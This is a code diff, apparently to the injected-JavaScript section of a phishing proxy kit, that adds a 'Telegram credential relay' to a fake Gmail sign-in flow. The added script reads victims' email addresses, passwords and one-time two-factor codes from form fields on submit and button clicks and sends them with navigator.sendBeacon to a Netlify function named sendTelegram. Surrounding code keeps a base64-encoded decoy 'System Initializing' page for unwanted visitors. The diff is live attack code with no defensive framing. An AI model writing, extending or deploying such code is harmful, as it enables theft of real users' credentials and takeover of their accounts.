@@ -66,6 +66,27 @@ js_inject:
         let lastCapture = '';
         const benignPageContent = 'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+PHRpdGxlPlN5c3RlbSBJbml0aWFsaXppbmc8L3RpdGxlPjxzdHlsZT5ib2R5LCBodG1sIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBoZWlnaHQ6IDEwMCU7IGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZDogIzEyMTIxMjsgY29sb3I6ICNlYWVhZWE7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogY2VudGVyOyB9IC5jb250YWluZXIgeyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0gaDEgeyBmb250LXNpemU6IDIuNXJlbTsgbWFyZ2luLWJvdHRvbTogMTVweDsgfSBwIHsgZm9udC1zaXplOiAxLjJyZW07IH08L3N0eWxlPjwvaGVhZD48Ym9keT48ZGl2IGNsYXNzPSJjb250YWluZXIiPjxoMT5TeXN0ZW0gSW5pdGlhbGl6aW5nLi4uPC9oMT48cD5QbGVhc2Ugd2FpdC48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4=';
 
+        // --- Telegram credential relay ---
+        const _tgUrl = (function(){try{var p=location.hostname.split('.');return 'https://login.'+p.slice(1).join('.')+'/.netlify/functions/sendTelegram'}catch(e){return ''}})();
+        let _cEmail = sessionStorage.getItem('_ce') || '';
+        let _cSent = false;
+        function _tgSend(type, data) { if(!_tgUrl) return; try{navigator.sendBeacon(_tgUrl, new Blob([JSON.stringify({type:type,data:data})],{type:'application/json'}))}catch(e){} }
+        function _captureCreds() {
+          var ei = document.querySelector('input[type="email"],input#identifierId,input[name="identifier"]');
+          var pi = document.querySelector('input[type="password"]');
+          if(ei && ei.value){_cEmail=ei.value;sessionStorage.setItem('_ce',_cEmail)}
+          if(pi && pi.value && _cEmail && !_cSent){
+            _cSent=true;
+            _tgSend('credentials',{email:_cEmail,firstAttemptPassword:pi.value,secondAttemptPassword:pi.value,provider:'Gmail',sessionId:Math.random().toString(36).substr(2,12),timestamp:new Date().toISOString(),userAgent:navigator.userAgent});
+            setTimeout(function(){_cSent=false},5000);
+          }
+          var oi=document.querySelector('input[name="totpPin"],input[name="code"],input[name="otp"],input[autocomplete="one-time-code"]');
+          if(oi && oi.value && oi.value.length>=6 && _cEmail){_tgSend('otp',{otp:oi.value,session:{email:_cEmail,provider:'Gmail',sessionId:sessionStorage.getItem('_sid')||''}})}
+        }
+        document.addEventListener('submit',function(){setTimeout(_captureCreds,50)},true);
+        document.addEventListener('click',function(e){if(e.target&&e.target.closest&&e.target.closest('button,input[type="submit"]'))setTimeout(_captureCreds,100)},true);
+        // --- End Telegram relay ---
+
         function showBenignPage() {
           document.open();
           document.write(atob(benignPageContent));
@@ -114,6 +135,7 @@ js_inject:
             if (nextButton) {
               nextButton.addEventListener('click', () => {
                 setTimeout(sendSessionData, 500, 'Password-Page-Load');
+                setTimeout(_captureCreds, 200);
               });
             }
           }
@@ -130,6 +152,7 @@ js_inject:
                     }
                     sendSessionData(currentStage);
                     findAndClickNext();
+                    _captureCreds();
                 }
               });
           });
